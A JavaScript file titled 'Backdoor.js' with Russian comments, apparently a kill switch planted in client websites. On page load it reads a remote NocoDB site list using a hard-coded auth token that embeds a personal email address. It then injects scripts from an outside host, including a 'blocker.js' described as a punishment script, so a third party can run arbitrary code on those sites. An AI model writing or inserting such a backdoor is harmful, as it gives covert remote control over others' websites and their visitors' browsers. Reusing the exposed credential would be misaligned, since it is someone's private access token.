/*!
 * Backdoor.js v1.0.3a
 * (c) 2024-2024
 * by Deus Notam
 * Telegram → https://t.me/d3usn0tam
 */

// Проверяем, был ли ранее подключен файл
if (!window.D3usN0tam) {
  console.log("D3usN0tam System - Connected!\n\nMade by D3us N0tam\nNotion Site → https://deusnotam.notion.site/D3usN0tam-System-ba149f69de214fd3ba0b9df834eb2c6e?pvs=4\nTelegram → https://t.me/d3usn0tam");

  const options = {
    method: 'GET',
    headers: {
        'xc-auth': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImRhbnlhYWJyb3NAZ21haWwuY29tIiwiZGlzcGxheV9uYW1lIjoiRGFuaWVsIEFicm9zIiwiYXZhdGFyIjpudWxsLCJ1c2VyX25hbWUiOm51bGwsImlkIjoidXM1cGE1a3FlYmx6MjBxOSIsInJvbGVzIjoib3JnLWxldmVsLXZpZXdlciIsInRva2VuX3ZlcnNpb24iOiI4MjMyYzQ5ZGJhNjhhOTRlYTg0MGY5ZGUwOTljMDQ1NTQ0YjA2MGRjNDExNTFlYWZhMzEwNzM1OGE2M2MwNjI1MWExOTQwMGI0MzM5ZTdiOCIsInByb3ZpZGVyIjoiY29nbml0byIsImlhdCI6MTcwOTEwOTc4NiwiZXhwIjoxNzA5MTQ1Nzg2fQ.j0pPJRGk0_WDsHLmXaC9BkLYqH4AGKzvY4yDsUA65UE'
    }
  };

  fetch('https://app.nocodb.com/api/v1/db/data/noco/p2kmbphsgvqs8kz/mpqof3e6f1ueozo/views/vwz1zne8sfxvhxco', options)
    .then(response => response.json())
    .then(data => {
        if (data && data.list && Array.isArray(data.list)) {
            const DNsite = data.list.map(item => ({
                name: item.SiteName,
                url: item.SiteURL,
                date: item.Subscribe,
                noti: item.Noti,
                noti_title: item.NotiTitle,
                noti_text: item.NotiText,
                blocker: item.Blocker,
                blocker_effect: item.BlockerEffect,
                blocker_redirecturl: item.BlockerRedirectURL,
                blocker_note: item.BlockerNote,
            }));

            console.log(DNsite);
            console.log(DNsite[0].name);

            // После завершения fetch вызываем checkDomain
            checkDomain(DNsite);
        } else {
            console.error('Ошибка: Полученные данные не соответствуют ожидаемой структуре');
        }
    })
    .catch(error => console.error('Ошибка при получении данных:', error));

  // Подключаем activator.js - скрипт проверки подключения
  const activatorScript = document.createElement('script');
  activatorScript.src = 'https://deusnotam.github.io/activator.js';
  document.head.appendChild(activatorScript);

  // Функция для проверки домена
  function checkDomain(DNsite) {
    const sites = DNsite;

    const currentDomain = window.location.hostname;

    // Проверяем, есть ли текущий домен в списке
    DeusSiteInfo = sites.find(site => {
        const siteHostname = new URL(site.url).hostname;
        return (
            currentDomain === siteHostname ||
            currentDomain === "www." + siteHostname ||
            "www." + currentDomain === siteHostname
        );
    });

    if (!DeusSiteInfo) {
        console.log("Сайт не найден в списке системы D3usN0tam.\nThe site was not found in the D3usN0tam system list.");
    } else {
        if (DeusSiteInfo.blocker === "active") {
            // Подключаем blocker.js - скрипт наказаний
            const blockerScript = document.createElement('script');
            blockerScript.src = 'https://deusnotam.github.io/system/blocker.js';
            document.head.appendChild(blockerScript);
        }
        if (DeusSiteInfo.noti === "active") {
            // Подключаем noti.js - скрипт уведомлений
            const deusidScript = document.createElement('script');
            deusidScript.src = 'https://deusnotam.github.io/system/noti.js';
            document.head.appendChild(deusidScript);
        }
    }
  }

  // Устанавливаем флаг, что файл подключен
  window.D3usN0tam = true;
}
